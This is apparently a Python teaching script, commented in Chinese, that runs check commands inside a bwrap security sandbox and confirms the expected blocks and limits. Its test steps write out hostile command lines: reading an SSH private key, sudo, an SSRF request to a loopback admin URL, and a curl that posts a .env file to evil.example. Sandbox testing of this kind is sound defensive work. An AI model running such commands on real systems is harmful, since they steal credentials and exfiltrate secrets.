#!/usr/bin/env python3
"""沙箱内部行为演示脚本（课程演示用）。

**必须在 ``sandbox`` 内部运行**。脚本逐条执行一组检查命令，并明确打印：

1. 实际执行的命令；
2. stdout 与 stderr；
3. 退出码；
4. 预期结果与实际判定。

检查覆盖：工作区可写、只读根、SSH 目录遮蔽、命令层敏感路径/高危命令拦截、
SSRF、数据外发、``no_new_privs`` 与 cgroup 资源限制。

用法
----
先在 VM 内部启动沙箱：

    cd ~/project
    ~/Desktop/project/.venv/bin/python -m sec_sandbox --preset standard

进入沙箱 shell 后执行：

    ~/Desktop/project/.venv/bin/python ~/Desktop/project/scripts/demo_attacks.py --pause

可选参数：

    --pause       每条命令执行前暂停，适合现场讲解
    --no-color    关闭彩色输出

脚本不会启动沙箱，也不会修改工作区之外的文件。
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shlex
import subprocess
import sys
from collections.abc import Callable, Sequence
from dataclasses import dataclass
from decimal import Decimal, InvalidOperation
from pathlib import Path
from typing import Any

REAL_BASH = Path("/usr/bin/real-bash")
GATEWAY_BASH = Path("/usr/bin/bash")
DENY_MARK = "[sec-sandbox] 已拦截"
INTERNAL_MARK = "[sec-sandbox] 内部错误"
RUN_TIMEOUT = 30.0

Validator = Callable[[int | None, str, str], tuple[bool | None, str]]


class Style:
    """仅在终端输出时启用 ANSI 颜色。"""

    def __init__(self, enabled: bool) -> None:
        self.enabled = enabled

    def _wrap(self, code: str, text: str) -> str:
        if not self.enabled:
            return text
        return f"\033[{code}m{text}\033[0m"

    def bold(self, text: str) -> str:
        return self._wrap("1", text)

    def cyan(self, text: str) -> str:
        return self._wrap("36", text)

    def green(self, text: str) -> str:
        return self._wrap("32", text)

    def yellow(self, text: str) -> str:
        return self._wrap("33", text)

    def red(self, text: str) -> str:
        return self._wrap("31", text)

    def dim(self, text: str) -> str:
        return self._wrap("2", text)


@dataclass(frozen=True)
class Step:
    """一条演示命令及其判定逻辑。"""

    title: str
    command: str
    argv: tuple[str, ...]
    expected: str
    validate: Validator


@dataclass(frozen=True)
class StepResult:
    """一条命令的实际执行结果；``ok=None`` 表示环境不支持该项检查。"""

    step: Step
    returncode: int | None
    stdout: str
    stderr: str
    ok: bool | None
    detail: str


# ---------------------------------------------------------------- 预检 ---


def _read_no_new_privs() -> str | None:
    try:
        status = Path("/proc/self/status").read_text(encoding="utf-8")
    except OSError:
        return None
    match = re.search(r"^NoNewPrivs:\s*(\d+)", status, re.MULTILINE)
    return match.group(1) if match else None


def _inside_sandbox() -> tuple[bool, str]:
    """确认脚本运行在 sandbox 内；否则给出可执行的启动提示。"""
    if not REAL_BASH.is_file():
        return False, (
            f"找不到 {REAL_BASH}。请先在 VM 内执行 "
            "`sudo bash scripts/setup.sh --mode vm` 创建真 bash 备份。"
        )

    if not os.environ.get("SECSAND_PROFILE"):
        return False, (
            "未检测到 SECSAND_PROFILE，当前不在 sandbox 内。\n"
            "请先启动沙箱：\n"
            "  cd ~/project\n"
            "  ~/Desktop/project/.venv/bin/python -m sec_sandbox --preset standard\n"
            "然后在沙箱 shell 内重新运行本脚本。"
        )

    no_new_privs = _read_no_new_privs()
    if no_new_privs != "1":
        return False, (
            f"NoNewPrivs={no_new_privs or '未知'}，当前不在 bwrap 沙箱内。\n"
            "请先启动 sandbox，再在沙箱 shell 内运行本脚本。"
        )

    return True, ""


# ---------------------------------------------------------------- profile ---


def _load_profile() -> dict[str, Any] | None:
    path_text = os.environ.get("SECSAND_PROFILE")
    if not path_text:
        return None
    try:
        data = json.loads(Path(path_text).read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return data if isinstance(data, dict) else None


def _expand_home(raw: str) -> Path:
    if raw.startswith("$HOME"):
        raw = str(Path.home()) + raw[len("$HOME") :]
    return Path(os.path.expanduser(raw))


def _workspace(profile: dict[str, Any] | None) -> Path:
    if profile is not None:
        raw = profile.get("workspace")
        if isinstance(raw, str) and raw:
            return _expand_home(raw)
    return Path.cwd()


def _resources(profile: dict[str, Any] | None) -> dict[str, Any]:
    if profile is None:
        return {}
    value = profile.get("resources")
    return value if isinstance(value, dict) else {}


def _memory_bytes(text: Any) -> int | None:
    if not isinstance(text, str):
        return None
    raw = text.strip().upper()
    multiplier = 1
    if raw.endswith("K"):
        multiplier, raw = 1024, raw[:-1]
    elif raw.endswith("M"):
        multiplier, raw = 1024 * 1024, raw[:-1]
    elif raw.endswith("G"):
        multiplier, raw = 1024 * 1024 * 1024, raw[:-1]
    try:
        value = int(raw)
    except ValueError:
        return None
    return value * multiplier if value > 0 else None


def _cpu_max(text: Any) -> str | None:
    if not isinstance(text, str) or not text.strip().endswith("%"):
        return None
    try:
        percent = Decimal(text.strip()[:-1])
    except InvalidOperation:
        return None
    if percent <= 0:
        return None
    return f"{int(percent * 1000)} 100000"


# ---------------------------------------------------------------- 判定 ---


def _check_rc0(returncode: int | None, stdout: str, stderr: str) -> tuple[bool, str]:
    if returncode == 0:
        return True, ""
    return False, f"期望退出码 0，实际为 {returncode}"


def _check_deny(returncode: int | None, stdout: str, stderr: str) -> tuple[bool, str]:
    if INTERNAL_MARK in stderr:
        return False, "出现内部错误，而不是策略拦截"
    if returncode != 126:
        return False, f"期望退出码 126，实际为 {returncode}"
    if DENY_MARK not in stderr:
        return False, "退出码为 126，但 stderr 没有拦截提示"
    return True, ""


def _check_failure(returncode: int | None, stdout: str, stderr: str) -> tuple[bool, str]:
    if returncode is None:
        return False, "命令未能执行"
    if returncode == 0:
        return False, "命令意外成功"
    return True, ""


def _check_ssh_file_hidden(
    returncode: int | None, stdout: str, stderr: str
) -> tuple[bool, str]:
    if "PRIVATE KEY" in stdout:
        return False, "stdout 中出现了私钥内容"
    if returncode == 0 and stdout.strip():
        return False, "命令成功且输出了非空内容"
    return True, "读取失败或内容为空，真实私钥不可见"


def _check_ssh_dir_masked(
    returncode: int | None, stdout: str, stderr: str
) -> tuple[bool, str]:
    if returncode != 0:
        return False, f"期望 ls 成功，实际退出码 {returncode}"
    leaked = [
        name
        for name in ("id_rsa", "id_ed25519", "authorized_keys", "known_hosts")
        if name in stdout
    ]
    if leaked:
        return False, f"目录中看到了真实密钥文件：{', '.join(leaked)}"
    return True, "目录为空或只有安全内容"


def _check_pwd(expected: Path) -> Validator:
    def validate(
        returncode: int | None, stdout: str, stderr: str
    ) -> tuple[bool, str]:
        if returncode != 0:
            return False, f"pwd 失败，退出码 {returncode}"
        actual = Path(stdout.strip())
        if os.path.realpath(actual) != os.path.realpath(expected):
            return False, f"实际 {actual}，期望 {expected}"
        return True, ""

    return validate


def _check_contains(expected_text: str) -> Validator:
    def validate(
        returncode: int | None, stdout: str, stderr: str
    ) -> tuple[bool, str]:
        if returncode != 0:
            return False, f"退出码 {returncode}"
        if expected_text not in stdout:
            return False, f"输出中没有 {expected_text!r}"
        return True, ""

    return validate


def _check_no_new_privs(
    returncode: int | None, stdout: str, stderr: str
) -> tuple[bool, str]:
    if returncode != 0:
        return False, f"grep 失败，退出码 {returncode}"
    match = re.search(r"^NoNewPrivs:\s*(\d+)", stdout, re.MULTILINE)
    if match is None:
        return False, "输出中没有 NoNewPrivs 字段"
    if match.group(1) != "1":
        return False, f"NoNewPrivs={match.group(1)}，期望 1"
    return True, ""


def _check_cgroup(expected: dict[str, Any] | None) -> Validator:
    def validate(
        returncode: int | None, stdout: str, stderr: str
    ) -> tuple[bool, str]:
        if returncode != 0:
            return False, f"cgroup 命令失败，退出码 {returncode}"

        values: dict[str, str] = {}
        for line in stdout.splitlines():
            key, separator, value = line.partition("=")
            if separator and key in {"memory.max", "pids.max", "cpu.max"}:
                values[key] = value.strip()

        missing = [name for name in ("memory.max", "pids.max") if name not in values]
        if missing:
            return False, f"未读到：{', '.join(missing)}"

        cpu_value = values.get("cpu.max", "(不可读)")
        cpu_available = cpu_value not in {"", "(不可读)"}

        if expected is None:
            if cpu_available:
                return True, "已读到 cgroup 限制（未取得 profile，跳过数值比对）"
            return None, "memory.max / pids.max 已读到；cpu.max 不可读"

        problems: list[str] = []
        want_memory = _memory_bytes(expected.get("memory_max"))
        want_pids = expected.get("pids_max")
        want_cpu = _cpu_max(expected.get("cpu_quota"))

        if want_memory is not None:
            try:
                actual_memory = int(values["memory.max"])
            except ValueError:
                actual_memory = None
            if actual_memory != want_memory:
                problems.append(f"memory.max={values['memory.max']}，期望 {want_memory}")

        if isinstance(want_pids, int) and not isinstance(want_pids, bool):
            try:
                actual_pids = int(values["pids.max"])
            except ValueError:
                actual_pids = None
            if actual_pids != want_pids:
                problems.append(f"pids.max={values['pids.max']}，期望 {want_pids}")

        if want_cpu is not None and cpu_available and cpu_value != want_cpu:
            problems.append(f"cpu.max={cpu_value}，期望 {want_cpu}")

        if problems:
            return False, "；".join(problems)
        if want_cpu is not None and not cpu_available:
            return None, (
                "memory.max / pids.max 与 profile 一致；"
                "cpu.max 不可读（当前用户 cgroup 未启用 cpu 控制器，"
                f"profile 配置为 {expected.get('cpu_quota')}）"
            )
        return True, "memory.max / pids.max / cpu.max 与 profile 一致"

    return validate


# ---------------------------------------------------------------- 步骤 ---


def _direct(command: str) -> tuple[str, ...]:
    """模拟交互 shell 中由 real-bash 直接执行的命令。"""
    return (str(REAL_BASH), "-c", command)


def _gateway(command: str) -> tuple[str, ...]:
    """经 ``/usr/bin/bash`` 进入 safe-exec 网关。"""
    return (str(GATEWAY_BASH), "-c", command)


def _build_steps(
    workspace: Path,
    resources: dict[str, Any] | None,
) -> list[Step]:
    notes = workspace / "notes.txt"
    notes_arg = shlex.quote(str(notes))
    write_command = (
        f"printf 'hello from sec-sandbox\\n' > {notes_arg} && cat {notes_arg}"
    )

    cgroup_command = (
        "cg=$(awk -F: '$1==\"0\" {print $3}' /proc/self/cgroup)\n"
        "printf 'cgroup=%s\\n' \"$cg\"\n"
        "for f in memory.max pids.max cpu.max; do\n"
        "  printf '%s=' \"$f\"\n"
        "  cat \"/sys/fs/cgroup$cg/$f\" 2>/dev/null || echo '(不可读)'\n"
        "done"
    )

    return [
        Step(
            title="确认当前工作目录",
            command="pwd",
            argv=_direct("pwd"),
            expected=f"输出应等于 workspace：{workspace}",
            validate=_check_pwd(workspace),
        ),
        Step(
            title="列出工作区内容",
            command="ls -la",
            argv=_direct("ls -la"),
            expected="命令成功，能看到工作区文件",
            validate=_check_rc0,
        ),
        Step(
            title="直接读取 SSH 私钥（mount 视图兜底）",
            command="cat ~/.ssh/id_rsa",
            argv=_direct("cat ~/.ssh/id_rsa"),
            expected="读取失败或为空；看不到真实私钥内容",
            validate=_check_ssh_file_hidden,
        ),
        Step(
            title="查看 SSH 目录（mount 视图兜底）",
            command="ls -la ~/.ssh",
            argv=_direct("ls -la ~/.ssh"),
            expected="目录为空或看不到真实密钥文件",
            validate=_check_ssh_dir_masked,
        ),
        Step(
            title="经网关读取 SSH 私钥（命令层拦截）",
            command="bash -c 'cat ~/.ssh/id_rsa'",
            argv=_gateway("cat ~/.ssh/id_rsa"),
            expected="退出码 126，stderr 出现“[sec-sandbox] 已拦截”",
            validate=_check_deny,
        ),
        Step(
            title="经网关执行提权命令（命令层拦截）",
            command="bash -c 'sudo ls'",
            argv=_gateway("sudo ls"),
            expected="退出码 126，stderr 出现“[sec-sandbox] 已拦截”",
            validate=_check_deny,
        ),
        Step(
            title="经网关访问回环地址（SSRF 拦截）",
            command="bash -c 'curl --max-time 3 http://127.0.0.1:8080/admin'",
            argv=_gateway("curl --max-time 3 http://127.0.0.1:8080/admin"),
            expected="退出码 126；不建立实际连接",
            validate=_check_deny,
        ),
        Step(
            title="经网关外发 .env（数据外发拦截）",
            command=(
                "bash -c 'curl --max-time 3 -d @"
                f"{shlex.quote(str(workspace / '.env'))} "
                "https://evil.example/upload'"
            ),
            argv=_gateway(
                "curl --max-time 3 -d @"
                f"{shlex.quote(str(workspace / '.env'))} "
                "https://evil.example/upload"
            ),
            expected="退出码 126；不产生实际外发",
            validate=_check_deny,
        ),
        Step(
            title="尝试写入系统目录（只读根）",
            command="touch /etc/secsand-demo",
            argv=_direct("touch /etc/secsand-demo"),
            expected="命令失败；根文件系统只读",
            validate=_check_failure,
        ),
        Step(
            title="写入工作区（工作区可写）",
            command=write_command,
            argv=_direct(write_command),
            expected="命令成功，并输出 hello from sec-sandbox",
            validate=_check_contains("hello from sec-sandbox"),
        ),
        Step(
            title="检查 no_new_privs",
            command="grep NoNewPrivs /proc/self/status",
            argv=_direct("grep NoNewPrivs /proc/self/status"),
            expected="输出 NoNewPrivs: 1",
            validate=_check_no_new_privs,
        ),
        Step(
            title="检查 cgroup 资源限制",
            command=cgroup_command,
            argv=_direct(cgroup_command),
            expected=(
                "memory.max / pids.max / cpu.max 与启动 profile 一致"
                if resources
                else "已读到 cgroup 限制；profile 不可用，仅展示数值"
            ),
            validate=_check_cgroup(resources or None),
        ),
    ]


# ---------------------------------------------------------------- 执行 ---


def _run(argv: tuple[str, ...]) -> tuple[int | None, str, str]:
    try:
        completed = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            errors="replace",
            timeout=RUN_TIMEOUT,
            check=False,
        )
    except FileNotFoundError:
        return None, "", f"命令不存在：{argv[0]}"
    except subprocess.TimeoutExpired:
        return None, "", f"命令超时（{RUN_TIMEOUT:.0f}s）"
    return completed.returncode, completed.stdout or "", completed.stderr or ""


def _print_block(style: Style, label: str, text: str) -> None:
    print(f"  {style.dim(label)}")
    if not text.strip():
        print("    (空)")
        return
    for line in text.rstrip().splitlines():
        print(f"    {line}")


def _render_header(
    style: Style,
    workspace: Path,
    profile_path: str,
    resources: dict[str, Any] | None,
    total: int,
) -> None:
    print()
    print(style.bold("沙箱内部行为演示"))
    print(f"  工作区    {workspace}")
    print(f"  profile   {profile_path}")
    if resources:
        print(
            "  资源限制  "
            f"memory={resources.get('memory_max', '?')}  "
            f"pids={resources.get('pids_max', '?')}  "
            f"cpu={resources.get('cpu_quota', '?')}"
        )
    print(f"  演示项    {total} 条")
    print(style.dim("  提示：脚本必须在 sandbox 内运行；本脚本不会启动沙箱。"))


def _render_step_header(style: Style, index: int, total: int, step: Step) -> None:
    print()
    print(style.dim("─" * 72))
    print(f"{style.bold(f'[{index:02d}/{total:02d}]')} {style.cyan(step.title)}")
    print(f"  {style.dim('命令')}")
    for line in step.command.splitlines():
        print(f"    {style.yellow(line)}")
    print(f"  {style.dim('预期')}  {step.expected}")


def _render_result(style: Style, result: StepResult) -> None:
    _print_block(style, "输出(stdout)", result.stdout)
    _print_block(style, "输出(stderr)", result.stderr)
    print(f"  {style.dim('退出码')}  {result.returncode}")
    if result.ok is True:
        verdict = style.green("✅ 通过")
        if result.detail:
            verdict += f"  {style.dim(result.detail)}"
    elif result.ok is None:
        verdict = style.yellow("⚠ 跳过")
        if result.detail:
            verdict += f"  {result.detail}"
    else:
        verdict = style.red("❌ 失败")
        if result.detail:
            verdict += f"  {result.detail}"
    print(f"  {style.dim('判定')}    {verdict}")


def _render_summary(style: Style, results: Sequence[StepResult]) -> None:
    passed = sum(1 for result in results if result.ok is True)
    skipped = sum(1 for result in results if result.ok is None)
    failed = sum(1 for result in results if result.ok is False)
    total = len(results)
    print()
    print(style.dim("═" * 72))
    print(style.bold("演示汇总"))
    for index, result in enumerate(results, start=1):
        if result.ok is True:
            mark = "✅"
        elif result.ok is None:
            mark = "⚠"
        else:
            mark = "❌"
        print(f"  {mark} [{index:02d}] {result.step.title}")
    print()
    if failed == 0 and skipped:
        print(style.green(f"无失败：通过 {passed}/{total}，跳过 {skipped}"))
    elif failed == 0:
        print(style.green(f"全部通过：{passed}/{total}"))
    else:
        print(
            style.red(
                f"通过 {passed}/{total}，失败 {failed}"
                + (f"，跳过 {skipped}" if skipped else "")
            )
        )
    print(style.dim("═" * 72))


# ---------------------------------------------------------------- 入口 ---


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="demo_attacks.py",
        description="在 sandbox 内部逐条执行检查命令，并打印命令、输出与判定。",
    )
    parser.add_argument(
        "--pause",
        action="store_true",
        help="每条命令执行前暂停，适合现场讲解",
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="关闭彩色输出",
    )
    args = parser.parse_args(list(argv) if argv is not None else None)

    inside, reason = _inside_sandbox()
    if not inside:
        print(f"[错误] {reason}", file=sys.stderr)
        return 2

    style = Style(enabled=not args.no_color and sys.stdout.isatty())
    profile = _load_profile()
    profile_path = os.environ.get("SECSAND_PROFILE", "(未知)")
    current = Path.cwd()
    profile_workspace = _workspace(profile) if profile is not None else None
    profile_matches = profile_workspace is not None and (
        os.path.realpath(profile_workspace) == os.path.realpath(current)
    )
    workspace = profile_workspace if profile_matches else current
    resources = _resources(profile) if profile_matches else None

    steps = _build_steps(workspace, resources)
    _render_header(style, workspace, profile_path, resources, len(steps))

    if profile_workspace is not None and not profile_matches:
        print(
            style.yellow(
                "  [警告] profile 中的 workspace "
                f"{profile_workspace} 与当前目录 {current} 不一致；"
                "可能被另一个 sandbox 覆盖。本次按当前目录验证，"
                "cgroup 数值只展示、不比对。"
            )
        )

    results: list[StepResult] = []
    for index, step in enumerate(steps, start=1):
        _render_step_header(style, index, len(steps), step)
        if args.pause:
            try:
                input(style.dim("  按回车执行…"))
            except EOFError:
                pass

        returncode, stdout, stderr = _run(step.argv)
        ok, detail = step.validate(returncode, stdout, stderr)
        result = StepResult(
            step=step,
            returncode=returncode,
            stdout=stdout,
            stderr=stderr,
            ok=ok,
            detail=detail,
        )
        results.append(result)
        _render_result(style, result)

    _render_summary(style, results)
    return 0 if all(result.ok is not False for result in results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
